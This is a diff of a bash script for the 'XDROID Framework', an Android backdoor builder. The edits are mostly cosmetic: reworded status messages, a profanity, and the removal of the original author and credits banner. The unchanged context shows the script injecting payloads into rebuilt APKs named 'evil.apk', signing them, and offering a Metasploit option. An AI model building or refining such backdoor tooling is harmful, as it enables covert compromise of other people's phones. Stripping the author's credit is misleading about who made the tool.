@@ -125,12 +125,12 @@ else
 echo ""
 echo -e $red "[ X ] xterm -> ${RedF}not found! "
 sleep 2
-echo -e $yellow "[ ! ] Installing Xterm "
+echo -e $yellow "[ ! ] Installing your Xterm "
 sleep 2
 echo -e $green ""
 sudo apt-get install xterm -y
 clear
-echo -e $blue "[ ✔ ] Done installing .... "
+echo -e $blue "[ ✔ ] Done installing Xtren .... "
 which xterm > /dev/null 2>&1
 fi
 #check if zenity is installed
@@ -148,7 +148,7 @@ sleep 2
 echo -e $green ""
 sudo apt-get install zenity -y
 clear
-echo -e $blue "[ ✔ ] Done installing .... "
+echo -e $blue "[ ✔ ] Done installing Zenity.... "
 which zenity > /dev/null 2>&1
 fi
 #Check for Android Asset Packaging Tool
@@ -167,7 +167,7 @@ echo -e $green ""
 sudo apt-get install aapt -y
 sudo apt-get install android-framework-res -y
 clear
-echo -e $blue "[ ✔ ] Done installing .... "
+echo -e $blue "[ ✔ ] Done installing Aapt.... "
 which aapt > /dev/null 2>&1
 fi
 #Check for Apktool Reverse Engineering
@@ -315,7 +315,7 @@ function apk_comp()
  echo -e $yellow ""
  echo "[*] Rebuilding APK file..."
  spinlong
- xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/payload -o evil.apk > /dev/null 2>&1
+ xterm -T "Rebuilding Your APK" -e java -jar $APKTOOL b $path/payload -o evil.apk > /dev/null 2>&1
  rm -r payload > /dev/null 2>&1
 }
 function apk_decomp1()
@@ -340,7 +340,7 @@ function error()
  rc=$?
  if [ $rc != 0 ]; then
    echo -e $red ""
-   echo "【X】 Failed to rebuild backdoored apk【X】"
+   echo "【X】 Failed to rebuild backdoored apk. FUCK【X】"
    echo
    apache_svc_stop
    postgresql_stop
@@ -587,7 +587,7 @@ function sign()
  spinlong
  if [ ! -f ~/.android/debug.keystore ]; then
      echo -e $red ""
-     echo " [ X ] Debug key not found. Generating one now..."
+     echo " [ X ] Debug key not found. Generating one now bro..."
      spinlong
      if [ ! -d "~/.android" ]; then
        mkdir ~/.android > /dev/null 2>&1
@@ -714,11 +714,7 @@ start=$(zenity --question --title="☢ XDROID Framework ☢" --text "Execute fra
     clear
     echo ""
     echo -e $lightgreen "╔──────────────────────────────────────────────╗"
-    echo -e $lightgreen "|           Author: Mascerano Bachir           |"
-    echo -e $lightgreen "|    XDROID Framework $ver - Dev-labs.co   |"
-    echo -e $lightgreen "|   Credits to : MrPedroubuntu , Kader Achraf  |"
-    echo -e $lightgreen "|               , youcef yahia                 |"
-    echo -e $lightgreen "|              and Mohammed Yacine             |"
+    echo -e $lightgreen "|               XDROID Framework               |"
     echo -e $lightgreen "┖──────────────────────────────────────────────┙"
     echo ""
     apache_svc_stop
@@ -735,7 +731,7 @@ function main()
         print_ascii_art
         echo -e $green ""
         echo "╔──────────────────────────────────────────────╗"
-        echo "|          XDROID Framework $ver           |"
+        echo "|          XDROID Framework $ver               |"
         echo "|      Hack & Remote android plateform         |"
         echo "┖──────────────────────────────────────────────┙"
         echo "[1] APK MSF                                     "
